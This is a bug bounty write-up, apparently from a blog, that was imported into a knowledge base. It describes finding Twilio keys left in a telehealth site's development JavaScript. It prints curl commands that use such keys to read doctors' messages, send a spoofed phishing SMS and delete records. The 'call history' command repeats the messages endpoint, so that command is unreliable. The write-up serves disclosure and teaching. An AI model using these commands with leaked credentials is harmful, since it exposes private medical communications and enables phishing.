---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-22_how-i-was-able-to-take-over-a-support-chat-using-leaked-keys.md
original_filename: 2022-07-22_how-i-was-able-to-take-over-a-support-chat-using-leaked-keys.md
title: How I was able to Take over a support chat using leaked Keys
category: documents
detected_topics:
- oauth
- sso
- jwt
- command-injection
- otp
- information-disclosure
tags:
- imported
- documents
- oauth
- sso
- jwt
- command-injection
- otp
- information-disclosure
language: en
raw_sha256: 4beeb44a4af3945006fdd2b14ab299d9ecc79aa7c7264fca31e2f6a84bb733c4
text_sha256: 5d4ea5527da4b59977523fe0f4f3687208c4d5240b488102592bc088643835d6
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# How I was able to Take over a support chat using leaked Keys

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-22_how-i-was-able-to-take-over-a-support-chat-using-leaked-keys.md
- Source Type: markdown
- Detected Topics: oauth, sso, jwt, command-injection, otp, information-disclosure
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `4beeb44a4af3945006fdd2b14ab299d9ecc79aa7c7264fca31e2f6a84bb733c4`
- Text SHA256: `5d4ea5527da4b59977523fe0f4f3687208c4d5240b488102592bc088643835d6`


## Content

---
title: "How I was able to Take over a support chat using leaked Keys"
url: "https://medium.com/@IroquoisPliskin/how-i-was-able-to-take-over-a-support-chat-using-leaked-keys-d5c4922bb3d4"
authors: ["Pliskin"]
bugs: ["Information disclosure"]
bounty: "1,000"
publication_date: "2022-07-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2416
scraped_via: "browseros"
---

# How I was able to Take over a support chat using leaked Keys

How I was able to Take over a support chat using leaked Keys
Pliskin
Follow
4 min read
·
Jul 22, 2022

19

1

Hello Everyone.
First, let me introduce myself. I’m Pliskin ( from MGS x) ), I’m an associate systems engineer, CTF player and I do some Bug Bounty Hunting on weekends/holidays.

Press enter or click to view image in full size
I added this pic to be the preview image ( still better than that meme XD )
Introduction:

It’s Friday morning and it’s very hot outside, what can we do on our holiday ? Why not go for bug hunting.
Our target is a TeleHealth website where you can have a virtual appointment with a doctor, it’s a private program so I will refer to it as www.site.com .

So, I started Burp and visited the website. Started testing all the available features.
Then when coming to authentication, I found a bug that allowed me to change my user ID. And after changing it and logon I can see that the userID is changed on the jwt.
So, I created two accounts :
I changed the user ID of account 1 to the user ID of account 2 to see if I can have access to his data.
But, after Login I had a blank page, I googled this and I found out that maybe there is some client/server side verification.
I tried response manipulation/ disabling JS before getting data and nothing worked.
At this point, I assumed that maybe the website checks the username with User ID after the authentication so I don’t have any solution.
Then I got a stupid idea on my mind which is testing multiple endpoints, perhaps some of them check only the User ID and not the User ID AND the username.
To try this idea I searched on all subdomains and then found : dev.site.com with the same page as the main website. I understand that it’s the same page but this one is used by the dev team to test changes before applying it on the main website.

I tried to login to see if the ATO will be successful and it didn’t work ( don’t tell me you were expecting that this will work XD ).

I forget about it, I had a call with my friend and when we were talking about life in Singapour I don’t know why I got the idea of checking the JS code while doing that XD.
So yeah, I compared the main JS code file of the main website with the dev one and found out that the dev one is much bigger.
CTRL+F filter by Key, token … and then I can see:

twillioAuthToken=”xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx”,twillioAuthSSID=”xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx”.

Get Pliskin’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I googled it and I found that it’s an API used for Voice, Video, email communications….
One of the reasons why I wrote this write-up is to show the impact of the Twillio leaked keys as I haven’t seen a write-up about it.
So yeah after searching about Auth token and SSID and how I can use it, I found this command to verify if these creds are working :

curl -X GET ‘https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN

the results are:

Addresses /2010–04–01/Accounts/$SSID/Addresses.json
Conferences /2010–04–01/Accounts/$SSID/Conferences.json
Signing_keys /2010–04–01/Accounts/$SSID/SigningKeys.json
Transcriptions /2010–04–01/Accounts/$SSID/Transcriptions.json
Connect_apps /2010–04–01/Accounts/$SSID/ConnectApps.json
Sip /2010–04–01/Accounts/$SSID/SIP.json
Authorized_connect_apps /2010–04–01/Accounts/$SSID/AuthorizedConnectApps.json
usage /2010–04–01/Accounts/$SSID/Usage.json
keys /2010–04–01/Accounts/$SSID/Keys.json
applications /2010–04–01/Accounts/$SSID/Applications.json
recordings /2010–04–01/Accounts/$SSID/Recordings.json
short_codes /2010–04–01/Accounts/$SSID/SMS/ShortCodes.json
calls /2010–04–01/Accounts/$SSID/Calls.json
notifications /2010–04–01/Accounts/$SSID/Notifications.json
incoming_phone_numbers /2010–04–01/Accounts/$SSID/IncomingPhoneNumbers.json
queues /2010–04–01/Accounts/$SSID/Queues.json
messages /2010–04–01/Accounts/$SSID/Messages.json
outgoing_caller_ids /2010–04–01/Accounts/$SSID/OutgoingCallerIds.json
available_phone_numbers /2010–04–01/Accounts/$SSID/AvailablePhoneNumbers.json
balance /2010–04–01/Accounts/$SSID/Balance.json

Then I did run

curl -X GET ‘https://api.twilio.com/2010-04-01/Accounts/$SSID/Messages.json' -u ACCOUNT_SID:AUTH_TOKEN

and Boom! I can see the messages between internal doctors.
So basically you can view all the history of the messages with the number it’s coming from, the destination, the body of the message and the media that are sent.
I can also see the history of calls using :

curl -X GET ‘https://api.twilio.com/2010-04-01/Accounts/$SSID/Messages.json' -u ACCOUNT_SID:AUTH_TOKEN

it gives information about each call like the phone number of the caller and the destination, the duration of the call and the records, notifications, streams and payments related to this call.
Not only I can view resources, I can also take actions.
I can send a message from any chosen number to any destination, as I have the messages history. I can send a phishing message from a doctor to another doctor using:

curl -X POST https://api.twilio.com/2010-04-01/Accounts/$TWILIO_ACCOUNT_SID/Messages.json \
— data-urlencode “Body=This will be the body of the new message” \
— data-urlencode “From=+15017122661” \
— data-urlencode “To=+15558675310” \
-u $TWILIO_ACCOUNT_SID:$TWILIO_AUTH_TOKEN

I can also delete a message using :

curl -X DELETE https://api.twilio.com/2010-04-01/Accounts/$TWILIO_ACCOUNT_SID/Messages/MMXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.json \
-u $TWILIO_ACCOUNT_SID:$TWILIO_AUTH_TOKEN

The deletion/creation can also be done to calls and all the available resources.
I didn’t list the other resources because I don’t want the report to be so long. But you can do amazing things using these resources like : getting records, SIP configuration, list Authorized Apps…
I got 1000$ bounty for this bug (and that was the maximum bounty for this target).
Thanks for reading.

Press enter or click to view image in full size
